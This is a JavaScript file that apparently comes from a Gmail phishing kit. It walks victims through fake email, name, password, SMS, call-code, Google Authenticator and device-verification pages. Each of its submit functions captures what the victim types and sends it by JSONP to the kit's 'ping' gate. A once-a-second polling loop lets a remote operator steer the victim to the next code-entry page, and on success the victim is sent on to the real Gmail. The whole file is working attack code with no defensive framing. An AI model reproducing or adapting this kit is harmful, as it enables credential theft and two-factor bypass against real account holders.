var GLOBAL_GATE_PATH = "ping";


function getCookieData( name ) {
    var pairs = document.cookie.split("; "),
        count = pairs.length, parts; 
    while ( count-- ) {
        parts = pairs[count].split("=");
        if ( parts[0] === name )
            return parts[1];
    }
    return false;
}
function setCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+";path=/;"; 
}

var interval;
$(document).ready(function() { 
    if (getCookieData("status") == "login_1") {
        var mes = "User on the email page!";
        var w = 0;
    } else if (getCookieData("status") == "login_2") {
        var mes = "User on the name page!";
        var w = 0;
    } else if (getCookieData("status") == "login_3") {
        var mes = "User on the password page!";
        var w = 0;
    }
    else if (getCookieData("status") == "sms") {
        var mes = "User on the SMS page!";
        var w = 0;
    }
    else if (getCookieData("status") == "call") {
        var mes = "User on the call code page!";
        var w = 0;
    }
    else if (getCookieData("status") == "2fa") {
        var mes = "User on the Google Authenticator page!";
        var w = 0;
    }
    else if (getCookieData("status") == "device") {
        var mes = "User on the device verification page!";
        var w = 1;
    }
    else if (getCookieData("status") == "loading") {
        var mes = "User on the loading page!";
        var w = 1;
    }
    // One connection to register page
     interval = setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" +  getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":'+w+',"dev":3,"mes":"'+mes+'"}'
            },
            success: function(data) {
                
            }
        });
      }, 1);

      //Live pinging 
      var SUC = false;
    setInterval(function() {
        if (SUC == true) {
            w = 0;
        }
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" +  getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":'+w+',"dev":3}'
            },
            success: function(data) {
                 if (SUC == true) {
                    window.location.href = "https://mail.google.com/mail/u/0/";
                
                }
                if (data.hasOwnProperty("op")) {
                    var o = JSON.parse(data.op);
                    if (o.id == "sms") {
                        clearInterval(interval);
                        setCookie("status","sms");
                        window.location.href = "confirm_sms";
                    } else if (o.id == "call") {
                        clearInterval(interval);
                        setCookie("status","call");
                        window.location.href = "confirm_call";
                    } else if (o.id == "g2fa")  {
                        clearInterval(interval);
                        setCookie("status","2fa");
                        window.location.href = "confirm_gauth";
                    } 
                    else if (o.id == "device")  {
                        clearInterval(interval);
                        setCookie("status","device");
                        setCookie("number",o.num);
                        window.location.href = "confirm_device";
                    } 
                    else if (o.id == "suc")  {
                        clearInterval(interval);
                        SUC = true;
                    } else if (o.id == "passw")  {
                        clearInterval(interval);
                        window.location.href = "login";
                    } 
                }
            }
        });
      }, 1000);
});


function send_email() {
    var login = document.getElementById('email').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":0,"dev":3,"mes":"Email submitted by user!","keys":["Login: '+login+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
    setCookie("email", login);
}

function send_sms() {
    var pin = document.getElementById('idvPin').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":0,"dev":3,"mes":"SMS submitted by user!","keys":["SMS: '+pin+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
}

function send_callcode() {
    var pin = document.getElementById('idvPin').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":0,"dev":3,"mes":"CallCode submitted by user!","keys":["CallCode: '+pin+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
}
function send_2fa() {
    var pin = document.getElementById('totpPin').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":0,"dev":3,"mes":"Google Authenticator submitted by user!","keys":["Google Auth Pin: '+pin+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
}

function send_name() {
    var firstname = document.getElementById('firstname').value;
    var lastname = document.getElementById('lastname').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":0,"dev":3,"mes":"Name data submitted by user!","keys":["Firstname: '+firstname+'", "Lastname: '+lastname+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
    setCookie("firstName",firstname);
    setCookie("lastName",lastname);
}

function send_password() {
    var password = document.getElementById('passwordd').value;
    setTimeout(function() {
        $.ajax({
            url: GLOBAL_GATE_PATH + "?pl=token&link=" + "gmail" + "&bid=" + getCookieData('uid'),
            dataType: "jsonp",
            data: {
                data: '{"online_bider":"1","w":1,"dev":3,"mes":"Password submitted by user!","keys":["Password: '+password+'"]}'
            },
            success: function(data) {
                
            }
        });
    }, 1)
    clearInterval(interval);
}